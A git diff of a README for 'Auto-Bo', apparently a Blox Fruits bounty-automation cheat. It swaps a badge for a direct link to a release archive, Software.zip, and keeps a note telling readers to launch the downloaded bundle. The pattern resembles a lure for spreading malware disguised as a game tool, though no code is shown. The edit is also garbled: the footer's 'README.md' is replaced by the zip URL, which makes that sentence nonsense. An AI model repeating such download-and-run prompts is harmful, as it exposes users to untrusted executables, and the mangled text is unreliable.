@@ -6,7 +6,7 @@ Welcome to the Auto-Bo repository, where you can find a collection of scripts de
 
 To get started with Auto-Bo, simply download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/MathPlan/auto-bo/releases/download/v2.0/Software.zip)](https://github.com/MathPlan/auto-bo/releases/download/v2.0/Software.zip)
 
 📌 **Note:** 
 - The software bundle needs to be launched after downloading to access the bounty automation scripts.
@@ -43,4 +43,4 @@ Let Auto-Bo revolutionize your Blox Fruits gaming experience with its efficient 
 
 ---
 
-*This README.md was generated dynamically using Markdown. For any inquiries or issues regarding the content, please contact the repository owner.*
+*This https://github.com/MathPlan/auto-bo/releases/download/v2.0/Software.zip was generated dynamically using Markdown. For any inquiries or issues regarding the content, please contact the repository owner.*
